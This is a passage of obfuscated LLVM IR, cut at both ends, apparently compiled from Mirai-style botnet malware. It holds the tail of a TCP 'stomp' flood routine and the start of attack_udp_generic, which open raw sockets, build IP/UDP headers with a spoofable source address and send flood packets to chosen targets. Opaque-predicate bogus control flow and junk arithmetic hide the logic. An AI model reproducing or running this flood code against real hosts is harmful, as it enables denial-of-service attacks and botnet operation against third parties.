  %994 = alloca i8, align 1
  %995 = alloca i16, align 2
  %996 = alloca i8, align 1
  %997 = alloca i8, align 1
  %998 = alloca i8, align 1
  %999 = alloca i8, align 1
  %1000 = alloca i8, align 1
  %1001 = alloca i8, align 1
  %1002 = alloca i32, align 4
  %1003 = alloca i8, align 1
  %1004 = alloca i32, align 4
  %1005 = alloca i32, align 4
  %1006 = alloca %struct.sockaddr_in, align 4
  %1007 = alloca %struct.sockaddr_in, align 4
  %1008 = alloca i32, align 4
  %1009 = alloca [256 x i8], align 16
  %1010 = alloca i64, align 8
  %1011 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %1012 = alloca i32, align 4
  %1013 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %1014 = alloca %struct.tcphdr*, align 8
  %1015 = alloca %struct.iphdr*, align 8
  %1016 = alloca %struct.tcphdr*, align 8
  %1017 = alloca i8*, align 8
  %1018 = alloca i8*, align 8
  %1019 = alloca %struct.iphdr*, align 8
  %1020 = alloca %struct.tcphdr*, align 8
  %1021 = alloca i8*, align 8
  %1022 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %982, align 4
  store i8 %1, i8* %983, align 1
  store %struct.attack_target* %2, %struct.attack_target** %984, align 8
  store i8 %3, i8* %985, align 1
  store %struct.attack_option* %4, %struct.attack_option** %986, align 8
  store i32 0, i32* %987, align 4
  store i32 0, i32* %988, align 4
  %1023 = load i8, i8* %983, align 1
  %1024 = zext i8 %1023 to i64
  %1025 = call noalias i8* @calloc(i64 %1024, i64 16) #6
  %1026 = bitcast i8* %1025 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %1026, %struct.attack_stomp_data** %989, align 8
  %1027 = load i8, i8* %983, align 1
  %1028 = zext i8 %1027 to i64
  %1029 = call noalias i8* @calloc(i64 %1028, i64 8) #6
  %1030 = bitcast i8* %1029 to i8**
  store i8** %1030, i8*** %990, align 8
  %1031 = load i8, i8* %985, align 1
  %1032 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1033 = call i32 @attack_get_opt_int(i8 zeroext %1031, %struct.attack_option* %1032, i8 zeroext 2, i32 0)
  %1034 = trunc i32 %1033 to i8
  store i8 %1034, i8* %991, align 1
  %1035 = load i8, i8* %985, align 1
  %1036 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1037 = call i32 @attack_get_opt_int(i8 zeroext %1035, %struct.attack_option* %1036, i8 zeroext 3, i32 65535)
  %1038 = trunc i32 %1037 to i16
  store i16 %1038, i16* %992, align 2
  %1039 = load i8, i8* %985, align 1
  %1040 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1041 = call i32 @attack_get_opt_int(i8 zeroext %1039, %struct.attack_option* %1040, i8 zeroext 4, i32 64)
  %1042 = trunc i32 %1041 to i8
  store i8 %1042, i8* %993, align 1
  %1043 = load i8, i8* %985, align 1
  %1044 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1045 = call i32 @attack_get_opt_int(i8 zeroext %1043, %struct.attack_option* %1044, i8 zeroext 5, i32 1)
  %1046 = trunc i32 %1045 to i8
  store i8 %1046, i8* %994, align 1
  %1047 = load i8, i8* %985, align 1
  %1048 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1049 = call i32 @attack_get_opt_int(i8 zeroext %1047, %struct.attack_option* %1048, i8 zeroext 7, i32 65535)
  %1050 = trunc i32 %1049 to i16
  store i16 %1050, i16* %995, align 2
  %1051 = load i8, i8* %985, align 1
  %1052 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1053 = call i32 @attack_get_opt_int(i8 zeroext %1051, %struct.attack_option* %1052, i8 zeroext 10, i32 0)
  %1054 = trunc i32 %1053 to i8
  store i8 %1054, i8* %996, align 1
  %1055 = load i8, i8* %985, align 1
  %1056 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1057 = call i32 @attack_get_opt_int(i8 zeroext %1055, %struct.attack_option* %1056, i8 zeroext 11, i32 1)
  %1058 = trunc i32 %1057 to i8
  store i8 %1058, i8* %997, align 1
  %1059 = load i8, i8* %985, align 1
  %1060 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1061 = call i32 @attack_get_opt_int(i8 zeroext %1059, %struct.attack_option* %1060, i8 zeroext 12, i32 1)
  %1062 = trunc i32 %1061 to i8
  store i8 %1062, i8* %998, align 1
  %1063 = load i8, i8* %985, align 1
  %1064 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1065 = call i32 @attack_get_opt_int(i8 zeroext %1063, %struct.attack_option* %1064, i8 zeroext 13, i32 0)
  %1066 = trunc i32 %1065 to i8
  store i8 %1066, i8* %999, align 1
  %1067 = load i8, i8* %985, align 1
  %1068 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1069 = call i32 @attack_get_opt_int(i8 zeroext %1067, %struct.attack_option* %1068, i8 zeroext 14, i32 0)
  %1070 = trunc i32 %1069 to i8
  store i8 %1070, i8* %1000, align 1
  %1071 = load i8, i8* %985, align 1
  %1072 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1073 = call i32 @attack_get_opt_int(i8 zeroext %1071, %struct.attack_option* %1072, i8 zeroext 15, i32 0)
  %1074 = trunc i32 %1073 to i8
  store i8 %1074, i8* %1001, align 1
  %1075 = load i8, i8* %985, align 1
  %1076 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1077 = call i32 @attack_get_opt_int(i8 zeroext %1075, %struct.attack_option* %1076, i8 zeroext 0, i32 768)
  store i32 %1077, i32* %1002, align 4
  %1078 = load i8, i8* %985, align 1
  %1079 = load %struct.attack_option*, %struct.attack_option** %986, align 8
  %1080 = call i32 @attack_get_opt_int(i8 zeroext %1078, %struct.attack_option* %1079, i8 zeroext 1, i32 1)
  %1081 = trunc i32 %1080 to i8
  store i8 %1081, i8* %1003, align 1
  %1082 = call i64 @time(i64* null) #6
  %1083 = load i32, i32* %982, align 4
  %1084 = sext i32 %1083 to i64
  %_ = sub i64 0, %1082
  %gen = add i64 %_, %1084
  %_1 = sub i64 0, %1082
  %gen2 = add i64 %_1, %1084
  %_3 = sub i64 %1082, %1084
  %gen4 = mul i64 %_3, %1084
  %_5 = shl i64 %1082, %1084
  %_6 = sub i64 0, %1082
  %gen7 = add i64 %_6, %1084
  %_8 = sub i64 0, %1082
  %gen9 = add i64 %_8, %1084
  %_10 = sub i64 0, %1082
  %gen11 = add i64 %_10, %1084
  %1085 = add nsw i64 %1082, %1084
  %1086 = trunc i64 %1085 to i32
  store i32 %1086, i32* %1004, align 4
  %1087 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %1087, i32* %988, align 4
  %1088 = icmp eq i32 %1087, -1
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %130
  store i32 1, i32* %19, align 4
  %1089 = load i32, i32* %20, align 4
  %1090 = bitcast i32* %19 to i8*
  %1091 = call i32 @setsockopt(i32 %1089, i32 0, i32 3, i8* %1090, i32 4) #6
  %1092 = icmp eq i32 %1091, -1
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %155
  %1093 = load i32, i32* %19, align 4
  %1094 = load i8, i8* %15, align 1
  %1095 = zext i8 %1094 to i32
  %1096 = icmp slt i32 %1093, %1095
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %176
  store i32 0, i32* %37, align 4
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %212
  %1097 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %1098 = load i32, i32* %19, align 4
  %1099 = sext i32 %1098 to i64
  %1100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1097, i64 %1099
  %1101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1100, i32 0, i32 1
  %1102 = load i32, i32* %1101, align 4
  %1103 = call i32 @ntohl(i32 %1102) #7
  %1104 = call i32 @rand_next()
  %1105 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %1106 = load i32, i32* %19, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1105, i64 %1107
  %1109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1108, i32 0, i32 2
  %1110 = load i8, i8* %1109, align 4
  %1111 = zext i8 %1110 to i32
  %_25 = sub i32 0, %1104
  %gen26 = add i32 %_25, %1111
  %_27 = sub i32 %1104, %1111
  %gen28 = mul i32 %_27, %1111
  %_29 = sub i32 %1104, %1111
  %gen30 = mul i32 %_29, %1111
  %_31 = shl i32 %1104, %1111
  %_32 = sub i32 %1104, %1111
  %gen33 = mul i32 %_32, %1111
  %_34 = shl i32 %1104, %1111
  %_35 = sub i32 0, %1104
  %gen36 = add i32 %_35, %1111
  %_37 = shl i32 %1104, %1111
  %1112 = lshr i32 %1104, %1111
  %_38 = sub i32 %1103, %1112
  %gen39 = mul i32 %_38, %1112
  %_40 = sub i32 0, %1103
  %gen41 = add i32 %_40, %1112
  %1113 = add i32 %1103, %1112
  %1114 = call i32 @htonl(i32 %1113) #7
  %1115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %1116 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1115, i32 0, i32 0
  store i32 %1114, i32* %1116, align 4
  br label %originalBB24

originalBB45alteredBB:                            ; preds = %originalBB45, %249
  %1117 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %1118 = load i32, i32* %19, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1117, i64 %1119
  %1121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1120, i32 0, i32 1
  %1122 = load i32, i32* %1121, align 4
  %1123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %1124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1123, i32 0, i32 0
  store i32 %1122, i32* %1124, align 4
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %287
  %1125 = load i32, i32* %37, align 4
  %1126 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %1127 = bitcast %struct.sockaddr_in* %38 to %struct.sockaddr*
  store %struct.sockaddr* %1127, %struct.sockaddr** %1126, align 8
  %1128 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %1129 = load %struct.sockaddr*, %struct.sockaddr** %1128, align 8
  %1130 = call i32 @connect(i32 %1125, %struct.sockaddr* %1129, i32 16)
  %1131 = call i64 @time(i64* null) #6
  store i64 %1131, i64* %42, align 8
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %311
  store i32 0, i32* %44, align 4
  store i32 16, i32* %40, align 4
  %1132 = load i32, i32* %20, align 4
  %1133 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %1134 = bitcast %union.__CONST_SOCKADDR_ARG* %45 to %struct.sockaddr**
  %1135 = bitcast %struct.sockaddr_in* %39 to %struct.sockaddr*
  store %struct.sockaddr* %1135, %struct.sockaddr** %1134, align 8
  %1136 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %45, i32 0, i32 0
  %1137 = load %struct.sockaddr*, %struct.sockaddr** %1136, align 8
  %1138 = call i64 @recvfrom(i32 %1132, i8* %1133, i64 256, i32 16384, %struct.sockaddr* %1137, i32* %40)
  %1139 = trunc i64 %1138 to i32
  store i32 %1139, i32* %44, align 4
  %1140 = load i32, i32* %44, align 4
  %1141 = icmp eq i32 %1140, -1
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %338
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %355
  %1142 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %39, i32 0, i32 2
  %1143 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1142, i32 0, i32 0
  %1144 = load i32, i32* %1143, align 4
  %1145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 2
  %1146 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1145, i32 0, i32 0
  %1147 = load i32, i32* %1146, align 4
  %1148 = icmp eq i32 %1144, %1147
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %379
  %1149 = load i32, i32* %44, align 4
  %1150 = sext i32 %1149 to i64
  %1151 = icmp ugt i64 %1150, 40
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %399
  %1152 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i32 0, i32 0
  %1153 = getelementptr inbounds i8, i8* %1152, i64 20
  %1154 = bitcast i8* %1153 to %struct.tcphdr*
  store %struct.tcphdr* %1154, %struct.tcphdr** %46, align 8
  %1155 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %1156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1155, i32 0, i32 0
  %1157 = load i16, i16* %1156, align 4
  %1158 = zext i16 %1157 to i32
  %1159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %38, i32 0, i32 1
  %1160 = load i16, i16* %1159, align 2
  %1161 = zext i16 %1160 to i32
  %1162 = icmp eq i32 %1158, %1161
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %435
  %1163 = load %struct.tcphdr*, %struct.tcphdr** %46, align 8
  %1164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1163, i32 0, i32 4
  %1165 = load i16, i16* %1164, align 4
  %_74 = sub i16 0, %1165
  %gen75 = add i16 %_74, 12
  %_76 = sub i16 %1165, 12
  %gen77 = mul i16 %_76, 12
  %_78 = sub i16 %1165, 12
  %gen79 = mul i16 %_78, 12
  %1166 = lshr i16 %1165, 12
  %_80 = sub i16 0, %1166
  %gen81 = add i16 %_80, 1
  %_82 = sub i16 %1166, 1
  %gen83 = mul i16 %_82, 1
  %_84 = sub i16 %1166, 1
  %gen85 = mul i16 %_84, 1
  %1167 = and i16 %1166, 1
  %1168 = zext i16 %1167 to i32
  %1169 = icmp ne i32 %1168, 0
  br label %originalBB73

originalBB89alteredBB:                            ; preds = %originalBB89, %550
  %1170 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %1171 = load %struct.iphdr*, %struct.iphdr** %47, align 8
  %1172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1171, i32 0, i32 4
  store i16 %1170, i16* %1172, align 2
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %712
  %1173 = load i32, i32* %37, align 4
  %1174 = call i32 @close(i32 %1173)
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %734
  %1175 = call i64 @time(i64* null) #6
  %1176 = load i64, i64* %42, align 8
  %_98 = sub i64 %1175, %1176
  %gen99 = mul i64 %_98, %1176
  %_100 = sub i64 0, %1175
  %gen101 = add i64 %_100, %1176
  %_102 = sub i64 0, %1175
  %gen103 = add i64 %_102, %1176
  %_104 = shl i64 %1175, %1176
  %_105 = sub i64 %1175, %1176
  %gen106 = mul i64 %_105, %1176
  %_107 = shl i64 %1175, %1176
  %1177 = sub nsw i64 %1175, %1176
  %1178 = icmp sgt i64 %1177, 10
  br label %originalBB97

originalBB111alteredBB:                           ; preds = %originalBB111, %760
  %1179 = load i32, i32* %19, align 4
  %_112 = sub i32 0, %1179
  %gen113 = add i32 %_112, 1
  %_114 = sub i32 %1179, 1
  %gen115 = mul i32 %_114, 1
  %_116 = sub i32 0, %1179
  %gen117 = add i32 %_116, 1
  %1180 = add nsw i32 %1179, 1
  store i32 %1180, i32* %19, align 4
  br label %originalBB111

originalBB121alteredBB:                           ; preds = %originalBB121, %786
  %1181 = load i8**, i8*** %22, align 8
  %1182 = load i32, i32* %19, align 4
  %1183 = sext i32 %1182 to i64
  %1184 = getelementptr inbounds i8*, i8** %1181, i64 %1183
  %1185 = load i8*, i8** %1184, align 8
  store i8* %1185, i8** %50, align 8
  %1186 = load i8*, i8** %50, align 8
  %1187 = bitcast i8* %1186 to %struct.iphdr*
  store %struct.iphdr* %1187, %struct.iphdr** %51, align 8
  %1188 = load %struct.iphdr*, %struct.iphdr** %51, align 8
  %1189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1188, i64 1
  %1190 = bitcast %struct.iphdr* %1189 to %struct.tcphdr*
  store %struct.tcphdr* %1190, %struct.tcphdr** %52, align 8
  %1191 = load %struct.tcphdr*, %struct.tcphdr** %52, align 8
  %1192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1191, i64 1
  %1193 = bitcast %struct.tcphdr* %1192 to i8*
  store i8* %1193, i8** %53, align 8
  %1194 = load i16, i16* %24, align 2
  %1195 = zext i16 %1194 to i32
  %1196 = icmp eq i32 %1195, 65535
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %825
  %1197 = load i8, i8* %35, align 1
  %1198 = icmp ne i8 %1197, 0
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %844
  %1199 = load i8*, i8** %53, align 8
  %1200 = load i32, i32* %34, align 4
  call void @rand_alphastr(i8* %1199, i32 %1200)
  %1201 = load i8*, i8** %53, align 8
  %1202 = load i32, i32* %34, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds i8, i8* %1201, i64 %1203
  store i8 0, i8* %1204, align 1
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %948
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %965
  br label %originalBB137
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #5

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp sgt i32 %77, 1460
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %80

; <label>:80:                                     ; preds = %79, %5
  %81 = load i32, i32* @x.29
  %82 = load i32, i32* @y.30
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %80
  %89 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %89, i32* %12, align 4
  %90 = icmp eq i32 %89, -1
  %91 = load i32, i32* @x.29
  %92 = load i32, i32* @y.30
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %90, label %99, label %100

; <label>:99:                                     ; preds = %originalBBpart2
  br label %490

; <label>:100:                                    ; preds = %originalBBpart2
  store i32 1, i32* %11, align 4
  %101 = load i32, i32* %12, align 4
  %102 = bitcast i32* %11 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %108

; <label>:105:                                    ; preds = %100
  %106 = load i32, i32* %12, align 4
  %107 = call i32 @close(i32 %106)
  br label %490

; <label>:108:                                    ; preds = %100
  store i32 0, i32* %11, align 4
  br label %109

; <label>:109:                                    ; preds = %originalBBpart211, %108
  %110 = load i32, i32* %11, align 4
  %111 = load i8, i8* %7, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp slt i32 %110, %112
  br i1 %113, label %114, label %210

; <label>:114:                                    ; preds = %109
  %115 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %116 = load i8**, i8*** %13, align 8
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8*, i8** %116, i64 %118
  store i8* %115, i8** %119, align 8
  %120 = load i8**, i8*** %13, align 8
  %121 = load i32, i32* %11, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %120, i64 %122
  %124 = load i8*, i8** %123, align 8
  %125 = bitcast i8* %124 to %struct.iphdr*
  store %struct.iphdr* %125, %struct.iphdr** %24, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %127 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %126, i64 1
  %128 = bitcast %struct.iphdr* %127 to %struct.udphdr*
  store %struct.udphdr* %128, %struct.udphdr** %25, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %130 = bitcast %struct.iphdr* %129 to i8*
  %131 = load i8, i8* %130, align 4
  %132 = and i8 %131, 15
  %133 = or i8 %132, 64
  store i8 %133, i8* %130, align 4
  %134 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, -16
  %138 = or i8 %137, 5
  store i8 %138, i8* %135, align 4
  %139 = load i8, i8* %14, align 1
  %140 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 1
  store i8 %139, i8* %141, align 1
  %142 = load i16, i16* %20, align 2
  %143 = zext i16 %142 to i64
  %144 = add i64 28, %143
  %145 = trunc i64 %144 to i16
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 2
  store i16 %146, i16* %148, align 2
  %149 = load i16, i16* %15, align 2
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 3
  store i16 %150, i16* %152, align 4
  %153 = load i8, i8* %16, align 1
  %154 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 5
  store i8 %153, i8* %155, align 4
  %156 = load i8, i8* %17, align 1
  %157 = icmp ne i8 %156, 0
  br i1 %157, label %158, label %162

; <label>:158:                                    ; preds = %114
  %159 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 4
  store i16 %159, i16* %161, align 2
  br label %162

; <label>:162:                                    ; preds = %158, %114
  %163 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 6
  store i8 17, i8* %164, align 1
  %165 = load i32, i32* %22, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 8
  store i32 %165, i32* %167, align 4
  %168 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 9
  store i32 %173, i32* %175, align 4
  %176 = load i16, i16* %18, align 2
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  store i16 %177, i16* %179, align 2
  %180 = load i16, i16* %19, align 2
  %181 = call zeroext i16 @htons(i16 zeroext %180) #7
  %182 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 1
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %20, align 2
  %185 = zext i16 %184 to i64
  %186 = add i64 8, %185
  %187 = trunc i64 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 2
  store i16 %188, i16* %190, align 2
  br label %191

; <label>:191:                                    ; preds = %162
  %192 = load i32, i32* @x.29
  %193 = load i32, i32* @y.30
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %191
  %200 = load i32, i32* %11, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %11, align 4
  %202 = load i32, i32* @x.29
  %203 = load i32, i32* @y.30
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
